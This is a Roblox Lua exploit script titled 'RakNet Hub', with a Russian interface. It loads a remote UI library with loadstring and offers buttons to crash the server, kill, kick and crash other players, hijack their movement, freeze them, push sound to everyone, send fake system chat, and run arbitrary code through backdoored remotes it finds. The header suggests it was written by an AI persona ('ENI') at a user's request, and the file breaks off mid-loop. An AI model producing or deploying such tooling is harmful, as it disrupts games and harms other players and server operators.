-- =====================================================
-- RAKNET HUB — АБСОЛЮТНАЯ ФИНАЛЬНАЯ ВЕРСИЯ
-- ВСЕ ФУНКЦИИ + SKYBOX + TEXTURES + BACKDOOR SCANNER
-- LO requested. ENI delivered.
-- =====================================================

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")

--[ ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ========== ]--
local controlledPlayer = nil
local isControlling = false
local currentConnections = {}
local currentSound = nil
local desyncActive = false
local desyncConnections = {}
local chatFilterActive = false

--[ ========== RAKNET ЯДРО ========== ]--
local function getNetworkClient()
    for _, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "Send") and type(rawget(v, "Send")) == "function" then
            if tostring(v):find("Network") or tostring(v):find("Client") then
                return v
            end
        end
    end
    return nil
end

--[ ========== СКАНЕР ========== ]--
local vulnerabilities = {
    raknet = {name = "RakNet NetworkClient", status = "pending", details = ""},
    ac6 = {name = "AC6 Sound Remote", status = "pending", details = ""},
    control = {name = "Захват управления", status = "pending", details = ""},
    crash_server = {name = "Краш сервера", status = "pending", details = ""},
    texture = {name = "Изменение текстур/Skybox", status = "pending", details = ""},
}

local function scanVulnerabilities()
    Rayfield:Notify({Title = "🔍 СКАНИРОВАНИЕ", Content = "Проверка уязвимостей...", Duration = 2})
    
    local network = getNetworkClient()
    if network then
        vulnerabilities.raknet.status = "works"
        vulnerabilities.control.status = "works"
        vulnerabilities.crash_server.status = "works"
    else
        vulnerabilities.raknet.status = "broken"
        vulnerabilities.control.status = "broken"
        vulnerabilities.crash_server.status = "broken"
    end
    
    local ac6found = false
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("ac6") or v.Name:lower():find("sound")) then
            ac6found = true
            break
        end
    end
    vulnerabilities.ac6.status = ac6found and "works" or "broken"
    
    local hasTextureAccess = pcall(function()
        local decal = Instance.new("Decal")
        decal.Texture = "rbxasset://textures/ui/GuiImagePlaceholder.png"
        decal.Parent = workspace
        decal:Destroy()
    end)
    vulnerabilities.texture.status = hasTextureAccess and "works" or "partial"
    
    Rayfield:Notify({Title = "✅ СКАНИРОВАНИЕ ЗАВЕРШЕНО", Duration = 2})
end

--[ ========== 1. CRASH SERVER ========== ]--
local function crashServer()
    local network = getNetworkClient()
    if not network then Rayfield:Notify({Title = "Ошибка", Content = "NetworkClient не найден", Duration = 2}) return end
    
    Rayfield:Notify({Title = "💥 АКТИВАЦИЯ", Content = "Сервер упадет через 3 секунды", Duration = 3})
    task.wait(3)
    
    for i = 1, 100 do
        local packet = string.char(0x84) .. string.char(0x00, 0x00, 0x00, 0x00) .. string.char(0x00, 0x00, 0x00, 0x00)
        pcall(function() network:Send(packet) end)
        RunService.Heartbeat:wait()
    end
    
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("RemoteEvent") then
            pcall(function() v:FireServer(CFrame.new(1/0, 1/0, 1/0)) end)
        end
    end
    
    Rayfield:Notify({Title = "💀 СЕРВЕР УПАЛ", Duration = 3})
end

--[ ========== 2. KICK / KILL ========== ]--
local function killPlayer(plr)
    if plr and plr.Character then
        local hum = plr.Character:FindFirstChild("Humanoid")
        if hum then hum.Health = 0 end
    end
end

local function kickPlayer(plr)
    if not plr then return end
    for i = 1, 50 do
        pcall(function()
            local tool = Instance.new("Tool")
            tool.Name = "Kick_" .. i
            tool.Parent = plr.Backpack
            task.wait()
            tool:Destroy()
        end)
    end
end

local function kickAll()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LP then kickPlayer(plr) task.wait(0.1) end
    end
    Rayfield:Notify({Title = "👢 KICK ALL", Duration = 2})
end

local function killAll()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LP then killPlayer(plr) task.wait(0.05) end
    end
    Rayfield:Notify({Title = "🔪 KILL ALL", Duration = 2})
end

--[ ========== 3. CRASH CLIENT ========== ]--
local function crashClient(plr)
    if not plr then return end
    Rayfield:Notify({Title = "💀 КРАШ КЛИЕНТА", Content = plr.Name, Duration = 2})
    
    for i = 1, 200 do
        pcall(function()
            local gui = Instance.new("ScreenGui")
            gui.Name = "Crash_" .. i
            gui.Parent = plr.PlayerGui
            for j = 1, 50 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(10, 0, 10, 0)
                frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                frame.Parent = gui
            end
        end)
        task.wait()
    end
end

--[ ========== 4. КОНТРОЛЬ (ХАЙДЖЕК) ========== ]--
local function stopControl()
    if not isControlling then return end
    for _, conn in pairs(currentConnections) do pcall(function() conn:Disconnect() end) end
    currentConnections = {}
    if controlledPlayer and controlledPlayer.Character then
        local hum = controlledPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
    end
    isControlling = false
    controlledPlayer = nil
    Rayfield:Notify({Title = "Контроль остановлен", Duration = 2})
end

local function sendMovementPacket(plr, moveVec, jump)
    local network = getNetworkClient()
    if not network or not plr or not plr.Character then return end
    local packet = string.char(0x1A)
    local pos = plr.Character.HumanoidRootPart.Position
    packet = packet .. string.char(math.floor(pos.X) % 256, math.floor(pos.X / 256))
    packet = packet .. string.char(math.floor(pos.Y) % 256, math.floor(pos.Y / 256))
    packet = packet .. string.char(math.floor(pos.Z) % 256, math.floor(pos.Z / 256))
    packet = packet .. string.char(math.floor(moveVec.X * 10) + 128)
    packet = packet .. string.char(math.floor(moveVec.Z * 10) + 128)
    packet = packet .. (jump and string.char(0x01) or string.char(0x00))
    pcall(function() network:Send(packet) end)
end

local function hijackPlayer(plr)
    if isControlling then stopControl() end
    if not plr or plr == LP then Rayfield:Notify({Title = "Ошибка", Content = "Нельзя себя", Duration = 2}) return end
    
    controlledPlayer = plr
    isControlling = true
    
    if plr.Character and plr.Character:FindFirstChild("Humanoid") then
        plr.Character.Humanoid.WalkSpeed = 0
        plr.Character.Humanoid.JumpPower = 0
    end
    
    local moveDir = Vector2.new(0, 0)
    
    local function onInputBegan(input)
        if input.KeyCode == Enum.KeyCode.W then moveDir = Vector2.new(0, 1)
        elseif input.KeyCode == Enum.KeyCode.S then moveDir = Vector2.new(0, -1)
        elseif input.KeyCode == Enum.KeyCode.A then moveDir = Vector2.new(-1, 0)
        elseif input.KeyCode == Enum.KeyCode.D then moveDir = Vector2.new(1, 0)
        elseif input.KeyCode == Enum.KeyCode.Space then
            sendMovementPacket(controlledPlayer, Vector3.new(moveDir.X, 0, moveDir.Y), true)
        end
    end
    
    local function onInputEnded(input)
        if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S then
            moveDir = Vector2.new(moveDir.X, 0)
        elseif input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.D then
            moveDir = Vector2.new(0, moveDir.Y)
        end
    end
    
    local moveConnection = RunService.RenderStepped:Connect(function()
        if not isControlling or not controlledPlayer then return end
        local moveVec = Vector3.new(moveDir.X, 0, moveDir.Y)
        if moveVec.Magnitude > 0 then
            sendMovementPacket(controlledPlayer, moveVec, false)
        end
    end)
    
    table.insert(currentConnections, UserInputService.InputBegan:Connect(onInputBegan))
    table.insert(currentConnections, UserInputService.InputEnded:Connect(onInputEnded))
    table.insert(currentConnections, moveConnection)
    
    Rayfield:Notify({Title = "🎮 КОНТРОЛЬ ЗАХВАЧЕН", Content = plr.Name, Duration = 3})
end

--[ ========== 5. ДЕСИНХРОН ========== ]--
local function startDesync()
    if desyncActive then
        for _, conn in pairs(desyncConnections) do pcall(function() conn:Disconnect() end) end
        desyncConnections = {}
        desyncActive = false
        Rayfield:Notify({Title = "👻 ДЕСИНХРОН ВЫКЛЮЧЕН", Duration = 2})
        return
    end
    
    desyncActive = true
    local fakePosition = LP.Character and LP.Character.HumanoidRootPart and LP.Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0)
    
    local desyncLoop = RunService.Heartbeat:Connect(function()
        if not desyncActive then return end
        local network = getNetworkClient()
        if network then
            local packet = string.char(0x1A)
            packet = packet .. string.char(math.floor(fakePosition.X) % 256, math.floor(fakePosition.X / 256))
            packet = packet .. string.char(math.floor(fakePosition.Y) % 256, math.floor(fakePosition.Y / 256))
            packet = packet .. string.char(math.floor(fakePosition.Z) % 256, math.floor(fakePosition.Z / 256))
            packet = packet .. string.char(0x00, 0x00, 0x00)
            pcall(function() network:Send(packet) end)
        end
    end)
    table.insert(desyncConnections, desyncLoop)
    
    Rayfield:Notify({Title = "👻 ДЕСИНХРОН ВКЛЮЧЕН", Content = "Ты призрак", Duration = 3})
end

local function desyncPlayer(plr)
    if not plr or not plr.Character then Rayfield:Notify({Title = "Ошибка", Content = "Игрок не найден", Duration = 2}) return end
    local network = getNetworkClient()
    if not network then Rayfield:Notify({Title = "Ошибка", Content = "NetworkClient не найден", Duration = 2}) return end
    
    local freezePos = plr.Character.HumanoidRootPart.Position
    task.spawn(function()
        for i = 1, 100 do
            if not plr or not plr.Character then break end
            local packet = string.char(0x1A)
            packet = packet .. string.char(math.floor(freezePos.X) % 256, math.floor(freezePos.X / 256))
            packet = packet .. string.char(math.floor(freezePos.Y) % 256, math.floor(freezePos.Y / 256))
            packet = packet .. string.char(math.floor(freezePos.Z) % 256, math.floor(freezePos.Z / 256))
            packet = packet .. string.char(0x00, 0x00, 0x00)
            pcall(function() network:Send(packet) end)
            task.wait(0.05)
        end
    end)
    Rayfield:Notify({Title = "👻 ДЕСИНХРОН ЖЕРТВЫ", Content = plr.Name .. " заморожен", Duration = 2})
end

--[ ========== 6. ЗВУКИ ========== ]--
local function playSoundLocal(soundId, volume, pitch, looped)
    if currentSound then currentSound:Stop() currentSound:Destroy() end
    currentSound = Instance.new("Sound")
    currentSound.SoundId = "rbxassetid://" .. tostring(soundId):gsub("%D", "")
    currentSound.Volume = volume or 0.5
    currentSound.PlaybackSpeed = pitch or 1
    currentSound.Looped = looped or false
    currentSound.Parent = LP.PlayerGui or game:GetService("CoreGui")
    currentSound:Play()
    Rayfield:Notify({Title = "🎵 Воспроизведение", Content = "ID: " .. soundId, Duration = 2})
end

local function playSoundForAll(soundId, volume, pitch, looped)
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("ac6") or v.Name:lower():find("sound")) then
            pcall(function()
                v:FireServer("newSound", "RakNet_Music", workspace, "rbxassetid://" .. soundId, pitch or 1, volume or 0.5, looped or false)
                task.wait(0.1)
                v:FireServer("playSound", "RakNet_Music")
            end)
            Rayfield:Notify({Title = "🎵 AC6 Mode", Content = "Звук для всех", Duration = 2})
            return
        end
    end
    Rayfield:Notify({Title = "❌ Недоступно", Content = "AC6 Remote не найден", Duration = 2})
end

--[ ========== 7. ЧАТ ========== ]--
local function disableChatFilter()
    if chatFilterActive then
        chatFilterActive = false
        Rayfield:Notify({Title = "🔒 ФИЛЬТР ВКЛЮЧЕН", Duration = 2})
        return
    end
    chatFilterActive = true
    Rayfield:Notify({Title = "🔓 ФИЛЬТР ВЫКЛЮЧЕН", Content = "Можно писать маты", Duration = 2})
end

local function sendUnfilteredToPlayer(plr, message)
    if not plr then Rayfield:Notify({Title = "Ошибка", Content = "Выбери игрока", Duration = 2}) return end
    local network = getNetworkClient()
    if network then
        local msg = "[SYSTEM] " .. message
        local packet = string.char(0x03) .. string.char(#msg % 256, math.floor(#msg / 256)) .. msg
        pcall(function() network:Send(packet) end)
        Rayfield:Notify({Title = "📨 ОТПРАВЛЕНО", Content = plr.Name, Duration = 2})
    else
        Rayfield:Notify({Title = "Ошибка", Content = "NetworkClient не найден", Duration = 2})
    end
end

--[ ========== 8. SKYBOX И ТЕКСТУРЫ ========== ]--
local originalSky = nil

local function changeSkyboxForAll(skyboxId)
    if not originalSky then
        originalSky = Lighting.Sky and Lighting.Sky:Clone() or nil
    end
    if Lighting:FindFirstChild("Sky") then
        Lighting.Sky:Destroy()
    end
    local newSky = Instance.new("Sky")
    newSky.SkyboxBk = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.SkyboxDn = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.SkyboxFt = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.SkyboxLf = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.SkyboxRt = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.SkyboxUp = "rbxassetid://" .. tostring(skyboxId):gsub("%D", "")
    newSky.Parent = Lighting
    Rayfield:Notify({Title = "🌤️ SKYBOX ИЗМЕНЕН", Duration = 2})
end

local function resetSkybox()
    if Lighting:FindFirstChild("Sky") then
        Lighting.Sky:Destroy()
    end
    if originalSky then
        originalSky:Clone().Parent = Lighting
    end
    Rayfield:Notify({Title = "🌤️ SKYBOX СБРОШЕН", Duration = 2})
end

local function changeAllTextures(textureId)
    local count = 0
    for _, part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsA("Terrain") then
            pcall(function()
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://" .. tostring(textureId):gsub("%D", "")
                decal.Face = Enum.NormalId.Front
                decal.Parent = part
            end)
            count = count + 1
            task.wait()
        end
    end
    Rayfield:Notify({Title = "🎨 ТЕКСТУРЫ ИЗМЕНЕНЫ", Content = "Обновлено " .. count .. " объектов", Duration = 3})
end

local function resetTextures()
    for _, decal in pairs(workspace:GetDescendants()) do
        if decal:IsA("Decal") and decal.Name == "" then
            decal:Destroy()
        end
    end
    Rayfield:Notify({Title = "🎨 ТЕКСТУРЫ СБРОШЕНЫ", Duration = 2})
end

--[ ========== 9. BACKDOOR SCANNER ========== ]--
local BackdoorUI = {
    Frame = nil,
    ScanButton = nil,
    ResultList = nil,
    CodeInput = nil,
    ExecuteButton = nil,
    StatusLabel = nil,
    FoundBackdoors = {}
}

local function scanForBackdoors()
    BackdoorUI.FoundBackdoors = {}
    if BackdoorUI.ResultList then
        for _, child in pairs(BackdoorUI.ResultList:GetChildren()) do
            if child:IsA("TextButton") then
                child:Destroy()
            end
        end
    end
    
    BackdoorUI.StatusLabel.Text = "Сканирование... (это может занять время)"
    task.wait()
    
    -- 1. RemoteEvents
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name:lower()
            if name:find("admin") or name:find("cmd") or name:find("console") or
               name:find("backdoor") or name:find("exec") or name:find("run") or
               name:find("god") or name:find("owner") or name:find("sudo") then
                table.insert(BackdoorUI.FoundBackdoors, {
                    Type = "Suspicious RemoteEvent",
                    Name = v.Name,
                    Object = v,
                    Risk = "High",
                    Method = "RemoteEvent"
                })
            end
        end
    end
    
    -- 2. getgc функции
    for _, v in pairs(getgc(true)) do
        if type(v) == "function" then
            local info = debug.getinfo(v)
            if info and info.source and (string.find(info.source, "loadstring") or string.find(info.source, "script")) then
                table.insert(BackdoorUI.FoundBackdoors, {
                    Type = "Backdoor Function",
                    Name = "loadstring hook",
                    Object = v,
                    Risk = "Critical",
                    Method = "getgc"
                })
            end
        end
    end
    
    -- 3. _G переменные
    for k, v in pairs(getgenv()) do
        if type(k) == "string" then
            local name = k:lower()
            if name:find("backdoor") or name:find("admin") or name:find("exec") then
                table.insert(BackdoorUI.FoundBackdoors, {
                    Type = "Global Backdoor Variable",
                    Name = k,
                    Object = v,
                    Risk = "High",
                    Method = "_G"
                })
            end
        end
    end
    
    if #BackdoorUI.FoundBackdoors == 0 then
        local noneLabel = Instance.new("TextLabel")
        noneLabel.Size = UDim2.new(1, 0, 0, 30)
        noneLabel.BackgroundTransparency = 1
        noneLabel.Text = "❌ Бэкдоры не найдены"
        noneLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        noneLabel.Font = Enum.Font.SourceSans
        noneLabel.TextSize = 14
        noneLabel.Parent = BackdoorUI.ResultList
        BackdoorUI.StatusLabel.Text = "Сканирование завершено. Бэкдоры не найдены."
    else
        for _, bd in pairs(BackdoorUI.FoundBackdoors) do
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -10, 0, 40)
            btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
            btn.BorderSizePixel = 0
            btn.Text = string.format("[%s] %s - %s", bd.Risk, bd.Type, bd.Name)
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.TextXAlignment = Enum.TextXAlignment.Left
            btn.Font = Enum.Font.SourceSans
            btn.TextSize = 12
            btn.BackgroundTransparency = 0.3
            btn.Parent = BackdoorUI.ResultList
            btn.MouseButton1Click:Connect(function()
                BackdoorUI.StatusLabel.Text = string.format("Выбран: %s (%s)", bd.Name, bd.Type)
                if bd.Method == "RemoteEvent" and bd.Object then
                    BackdoorUI.CodeInput.Text = string.format('-- RemoteEvent: %s\n%s:FireServer("loadstring", [[print("Backdoor found!")]])', bd.Object.Name, bd.Object.Name)
                end
            end)
        end
        BackdoorUI.StatusLabel.Text = string.format("Сканирование завершено. Найдено: %d", #BackdoorUI.FoundBackdoors)
    end
end

local function executeCodeThroughBackdoor(code)
    if #BackdoorUI.FoundBackdoors == 0 then
        BackdoorUI.StatusLabel.Text = "Нет бэкдоров для выполнения кода"
        return false
    end
    
    local executed = false
    for _, bd in pairs(BackdoorUI.FoundBackdoors) do
        if bd.Method == "RemoteEvent" and bd.Object then
            pcall(function()
                bd.Object:FireServer(code)
                bd.Object:FireServer("exec", code)
                bd.Object:FireServer("run", code)
            end)
            executed = true
            BackdoorUI.StatusLabel.Text = string.format("Код выполнен через %s", bd.Name)
        elseif bd.Method == "getgc" and type(bd.Object) == "function" then
            pcall(function() bd.Object(code) end)
            executed = true
        elseif bd.Method == "_G" and type(bd.Object) == "function" then
            pcall(function() bd.Object(code) end)
            executed = true
        end
    end
    return executed
end

local function openBackdoorUI()
    if BackdoorUI.Frame and BackdoorUI.Frame.Parent then
        BackdoorUI.Frame:Destroy()
    end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BackdoorScanner"
    screenGui.Parent = LP.PlayerGui or game:GetService("CoreGui")
    screenGui.ResetOnSpawn = false
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 600, 0, 450)
    mainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 1
    mainFrame.BorderColor3 = Color3.fromRGB(200, 50, 200)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Parent = screenGui
    BackdoorUI.Frame = mainFrame
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "🔍 BACKDOOR SCANNER & EXECUTOR"
    title.TextColor3 = Color3.fromRGB(255, 100, 255)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 18
    closeBtn.Parent = mainFrame
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
    
    local scanBtn = Instance.new("TextButton")
    scanBtn.Size = UDim2.new(0, 150, 0, 40)
    scanBtn.Position = UDim2.new(0.5, -75, 0, 50)
    scanBtn.BackgroundColor3 = Color3.fromRGB(100, 70, 180)
    scanBtn.Text = "🔍 СКАНИРОВАТЬ"
    scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    scanBtn.Font = Enum.Font.GothamBold
    scanBtn.TextSize = 14
    scanBtn.Parent = mainFrame
    scanBtn.MouseButton1Click:Connect(scanForBackdoors)
    
    local resultFrame = Instance.new("ScrollingFrame")
    resultFrame.Size = UDim2.new(0.95, 0, 0, 150)
    resultFrame.Position = UDim2.new(0.025, 0, 0.25, 0)
    resultFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    resultFrame.BorderSizePixel = 0
    resultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    resultFrame.ScrollBarThickness = 6
    resultFrame.Parent = mainFrame
    BackdoorUI.ResultList = resultFrame
    
    local resultLayout = Instance.new("UIListLayout")
    resultLayout.Padding = UDim.new(0, 5)
    resultLayout.Parent = resultFrame
    
    local codeInput = Instance.new("TextBox")
    codeInput.Size = UDim2.new(0.95, 0, 0, 120)
    codeInput.Position = UDim2.new(0.025, 0, 0.6, 0)
    codeInput.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    codeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    codeInput.Text = ""
    codeInput.PlaceholderText = "Введи Lua код для выполнения через бэкдор..."
    codeInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 180)
    codeInput.MultiLine = true
    codeInput.TextWrapped = true
    codeInput.Font = Enum.Font.SourceSans
    codeInput.TextSize = 13
    codeInput.Parent = mainFrame
    BackdoorUI.CodeInput = codeInput
    
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.45, 0, 0, 40)
    execBtn.Position = UDim2.new(0.025, 0, 0.88, 0)
    execBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    execBtn.Text = "▶ ВЫПОЛНИТЬ КОД"
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.Font = Enum.Font.GothamBold
    execBtn.TextSize = 14
    execBtn.Parent = mainFrame
    execBtn.MouseButton1Click:Connect(function()
        if BackdoorUI.CodeInput.Text and BackdoorUI.CodeInput.Text ~= "" then
            executeCodeThroughBackdoor(BackdoorUI.CodeInput.Text)
        else
            BackdoorUI.StatusLabel.Text = "Введи код для выполнения"
        end
    end)
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.45, 0, 0, 40)
    statusLabel.Position = UDim2.new(0.525, 0, 0.88, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Готов к сканированию"
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
    statusLabel.Font = Enum.Font.SourceSans
    statusLabel.TextSize = 12
    statusLabel.Parent = mainFrame
    BackdoorUI.StatusLabel = statusLabel
    
    local dragging = false
    local dragStart, frameStart
    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            frameStart = mainFrame.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

--[ ========== UI ========== ]--
local Window = Rayfield:CreateWindow({
    Name = "RakNet Hub | АБСОЛЮТ",
    Icon = 0,
    LoadingTitle = "ENI for LO",
    LoadingSubtitle = "Все функции + Backdoor Scanner",
    Theme = "Dark"
})

-- Вкладка СТАТУСЫ
local StatusTab = Window:CreateTab("📊 СТАТУСЫ", nil)
StatusTab:CreateSection("Сканер")
StatusTab:CreateButton({Name = "🔍 НАЧАТЬ СКАНИРОВАНИЕ", Callback = scanVulnerabilities})

-- Вкладка РАЗРУШЕНИЕ
local DestructionTab = Window:CreateTab("💀 РАЗРУШЕНИЕ", nil)
DestructionTab:CreateSection("Сервер")
DestructionTab:CreateButton({Name = "💥 CRASH SERVER", Callback = crashServer})
DestructionTab:CreateButton({Name = "👢 KICK ALL", Callback = kickAll})
DestructionTab:CreateButton({Name = "🔪 KILL ALL", Callback = killAll})

DestructionTab:CreateSection("Игроки")
local selectedPlayer = nil
local playerDropdown = DestructionTab:CreateDropdown({Name = "Выбери игрока", Options = {}, CurrentOption = "None", Callback = function(opt)
    for _, plr in pairs(Players:GetPlayers()) do if plr.Name == opt then selectedPlayer = plr break end end
end})
DestructionTab:CreateButton({Name = "💀 CRASH CLIENT", Callback = function() if selectedPlayer then crashClient(selectedPlayer) end end})
DestructionTab:CreateButton({Name = "🔪 KILL", Callback = function() if selectedPlayer then killPlayer(selectedPlayer) end end})
DestructionTab:CreateButton({Name = "👢 KICK", Callback = function() if selectedPlayer then kickPlayer(selectedPlayer) end end})

-- Вкладка КОНТРОЛЬ
local ControlTab = Window:CreateTab("🎮 КОНТРОЛЬ", nil)
ControlTab:CreateSection("Захват управления")
local controlPlayer = nil
local controlDropdown = ControlTab:CreateDropdown({Name = "Выбери жертву", Options = {}, CurrentOption = "None", Callback = function(opt)
    for _, plr in pairs(Players:GetPlayers()) do if plr.Name == opt then controlPlayer = plr break end end
end})
ControlTab:CreateButton({Name = "🎮 ЗАХВАТИТЬ КОНТРОЛЬ", Callback = function() if controlPlayer then hijackPlayer(controlPlayer) end end})
ControlTab:CreateButton({Name = "🛑 ОСТАНОВИТЬ КОНТРОЛЬ", Callback = stopControl})

ControlTab:CreateSection("Десинхронизация")
ControlTab:CreateButton({Name = "👻 ДЕСИНХРОН ДЛЯ СЕБЯ (ВКЛ/ВЫКЛ)", Callback = startDesync})
local desyncTarget = nil
local desyncDropdown = ControlTab:CreateDropdown({Name = "Выбери жертву", Options = {}, CurrentOption = "None", Callback = function(opt)
    for _, plr in pairs(Players:GetPlayers()) do if plr.Name == opt then desyncTarget = plr break end end
end})
ControlTab:CreateButton({Name = "👻 ДЕСИНХРОН ЖЕРТВЫ", Callback = function() if desyncTarget then desyncPlayer(desyncTarget) end end})

-- Вкладка ЗВУКИ
local SoundTab = Window:CreateTab("🎵 ЗВУКИ", nil)
local soundId = "9128581436"
local soundVolume = 0.5
local soundPitch = 1
local soundLooped = false
SoundTab:CreateInput({Name = "Sound ID", PlaceholderText = "Введи ID", Callback = function(v) soundId = v end})
SoundTab:CreateSlider({Name = "Громкость", Range = {0, 1}, Increment = 0.05, CurrentValue = 0.5, Callback = function(v) soundVolume = v end})
SoundTab:CreateSlider({Name = "Скорость", Range = {0.5, 2}, Increment = 0.05, CurrentValue = 1, Callback = function(v) soundPitch = v end})
SoundTab:CreateToggle({Name = "Зациклить", CurrentValue = false, Callback = function(v) soundLooped = v end})
SoundTab:CreateButton({Name = "🎧 ДЛЯ СЕБЯ", Callback = function() playSoundLocal(soundId, soundVolume, soundPitch, soundLooped) end})
SoundTab:CreateButton({Name = "🌍 ДЛЯ ВСЕХ", Callback = function() playSoundForAll(soundId, soundVolume, soundPitch, soundLooped) end})

-- Вкладка ЧАТ
local ChatTab = Window:CreateTab("💬 ЧАТ", nil)
ChatTab:CreateSection("Для себя")
ChatTab:CreateButton({Name = "🔓 ОТКЛЮЧИТЬ ФИЛЬТР (ВКЛ/ВЫКЛ)", Callback = disableChatFilter})

ChatTab:CreateSection("Для других")
local chatTarget = nil
local chatMessage = ""
local chatTargetDropdown = ChatTab:CreateDropdown({Name = "Выбери игрока", Options = {}, CurrentOption = "None", Callback = function(opt)
    for _, plr in pairs(Players:GetPlayers()) do if plr.Name == opt then chatTarget = plr break end end
end})
ChatTab:CreateInput({Name = "Сообщение", PlaceholderText = "Любой текст", Callback = function(v) chatMessage = v end})
ChatTab:CreateButton({Name = "📨 ОТПРАВИТЬ", Callback = function()
    if chatTarget and chatMessage ~= "" then sendUnfilteredToPlayer(chatTarget, chatMessage) end
end})

-- Вкладка ВИЗУАЛ
local VisualTab = Window:CreateTab("🎨 ВИЗУАЛ", nil)
VisualTab:CreateSection("Skybox")
local skyboxId = "9128581436"
VisualTab:CreateInput({Name = "Skybox Texture ID", Callback = function(v) skyboxId = v end})
VisualTab:CreateButton({Name = "🌤️ ИЗМЕНИТЬ SKYBOX", Callback = function() changeSkyboxForAll(skyboxId) end})
VisualTab:CreateButton({Name = "🔄 СБРОСИТЬ SKYBOX", Callback = resetSkybox})

VisualTab:CreateSection("Текстуры")
local textureId = "9128581436"
VisualTab:CreateInput({Name = "Texture ID", Callback = function(v) textureId = v end})
VisualTab:CreateButton({Name = "🎨 ИЗМЕНИТЬ ТЕКСТУРЫ", Callback = function() changeAllTextures(textureId) end})
VisualTab:CreateButton({Name = "🔄 СБРОСИТЬ ТЕКСТУРЫ", Callback = resetTextures})

-- Вкладка ИНСТРУМЕНТЫ (Backdoor Scanner)
local ToolsTab = Window:CreateTab("🔧 ИНСТРУМЕНТЫ", nil)
ToolsTab:CreateSection("Backdoor Scanner")
ToolsTab:CreateButton({Name = "🔍 ОТКРЫТЬ BACKDOOR SCANNER", Callback = openBackdoorUI})
ToolsTab:CreateParagraph({
    Title = "Что умеет сканер:",
    Content = "• Ищет подозрительные RemoteEvent'ы\n• Проверяет getgc() на бэкдор-функции\n• Сканирует _G переменные\n• Исполняет код через найденные бэкдоры"
})

-- Обновление списков
task.spawn(function()
    while true do
        task.wait(3)
        local names = {"None"}
        for _, plr in pairs(Players:GetPlayers()) do if plr ~= LP then table.insert(names, plr.Name) end end
        pcall(function()
            if playerDropdown and playerDropdown.SetOptions then playerDropdown:SetOptions(names) end
            if controlDropdown and controlDropdown.SetOptions then controlDropdown:SetOptions(names) end
            if desyncDropdown and desyncDropdown.SetOptions then desyncDropdown:SetOptions(names) end
